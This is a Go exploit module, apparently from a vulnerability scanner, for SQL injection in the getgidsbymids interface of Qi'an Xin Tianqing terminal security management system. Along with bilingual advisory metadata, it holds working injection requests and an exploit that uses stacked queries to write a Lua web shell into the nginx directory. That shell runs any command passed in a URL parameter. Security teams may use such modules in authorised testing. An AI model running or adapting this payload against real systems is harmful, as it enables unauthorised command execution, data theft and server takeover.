...
func init() {
	expJson := `{
    "Name": "Tianqing Terminal Security Management System getgidsbymids method SQL Injection Lead to Command Execution Vulnerability",
    ...
    "Level": "3",
    "Impact": "<p>There is SQL injection in the mids parameter in the /api/dp/getgidsbymids interface of Qi'an Xintianqing terminal security management system.  In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    ...
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131'",
        ...
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131'))%3b+--+aw",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
    ...
    "Translation": {
        "CN": {
            "Name": "天擎终端安全管理系统getgidsbymids方法 SQL 注入导致命令执行漏洞",
            "Product": "奇安信-天擎",
            ...
            "Recommendation": "<p>1、厂商已经修复此漏洞，升级至最新版本&nbsp;<a href=\"https://www.qianxin.com/\" rel=\"nofollow\">https://www.qianxin.com/</a></p><p>2、部署web应用防火墙，对数据库操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p>奇安信天擎终端安全管理系统/api/dp/getgidsbymids 接口中的mids参数存在SQL注入。<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
        ...
        "EN": {
            ...
            "Product": "Qi Anxin-Tianqing",
            "Description": "<p>Qi'an Xintianqing terminal security management system is an integrated terminal security product solution for government and enterprise units. The product integrates functions such as antivirus, terminal security control, terminal access, terminal auditing, peripheral management and control, and EDR. It is compatible with different operating systems and computing platforms, helping customers achieve platform integration, function integration, and data integration. Terminal security three-dimensional protection.</p><p>There is a SQL injection vulnerability in the console of Qi'an Xintianqing terminal security management system.&nbsp;In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability and upgraded to the latest version</p><p><a href=\"https://www.qianxin.com/\" rel=\"nofollow\">https://www.qianxin.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			...
			name := goutils.RandomHexString(5)
			filename := "test" + name
			...
			if resp, err := httpclient.SimpleGet(uri); err == nil && resp.StatusCode == 200 {
				...
				uri1 := "/api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131'));create+table+O(T+TEXT);insert+into+O(T)+values('if+ngx.req.get_uri_args().cmd+then+cmd+=+ngx.req.get_uri_args().cmd+local+t+=+io.popen(cmd)+local+a+=+t:read(\"*all\")+ngx.say(a)+end');copy+O(T)+to+'" + root_path + "nginx/lua/" + filename + ".luac';drop+table+O;+--+aa"
				if root_path == "error" {
					expResult.Success = true
					...
					if err == nil && strings.Contains(resp.Utf8Html, "success") {
						if resp, err = httpclient.SimpleGet(uri); err == nil && resp.StatusCode == 200 {
							expResult.Success = true
